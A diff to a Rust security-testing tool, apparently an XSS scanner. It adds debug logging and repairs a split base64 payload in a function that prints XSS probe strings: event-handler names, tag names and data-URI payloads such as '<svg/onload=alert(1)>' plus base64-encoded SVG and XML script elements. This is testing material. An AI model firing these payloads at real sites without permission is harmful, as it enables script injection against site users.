@@ -35,8 +35,12 @@ fn fetch_and_print_remote(provider: &str) {
                         return;
                     }
                     if let Some(list) = crate::utils::get_remote_payloads() {
+                        let count = list.len();
                         for p in list.iter() {
                             println!("{}", p);
+                        }
+                        if crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed) {
+                            eprintln!("[DBG] {}: {} payloads", provider, count);
                         }
                     } else {
                         eprintln!(
@@ -57,13 +61,21 @@ fn fetch_and_print_remote(provider: &str) {
 pub fn run_payload(args: PayloadArgs) {
     match args.selector.as_deref() {
         Some("event-handlers") => {
-            for ev in crate::payload::xss_event::common_event_handler_names().iter() {
+            let list = crate::payload::xss_event::common_event_handler_names();
+            for ev in list.iter() {
                 println!("{}", ev);
+            }
+            if crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed) {
+                eprintln!("[DBG] event-handlers: {} items", list.len());
             }
         }
         Some("useful-tags") => {
-            for t in crate::payload::xss_html::useful_html_tag_names().iter() {
+            let list = crate::payload::xss_html::useful_html_tag_names();
+            for t in list.iter() {
                 println!("{}", t);
+            }
+            if crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed) {
+                eprintln!("[DBG] useful-tags: {} items", list.len());
             }
         }
         Some("payloadbox") => {
@@ -78,12 +90,14 @@ pub fn run_payload(args: PayloadArgs) {
             println!("data:text/html;,<svg/onload=alert(1)>");
             println!("data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==");
             println!(
-                "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1s"
+                "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sJz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg=="
             );
-            println!("Jz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==");
             println!(
                 "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4="
             );
+            if crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed) {
+                eprintln!("[DBG] uri-scheme: 5 payloads");
+            }
         }
         Some(other) => {
             eprintln!("Unknown selector: {}", other);
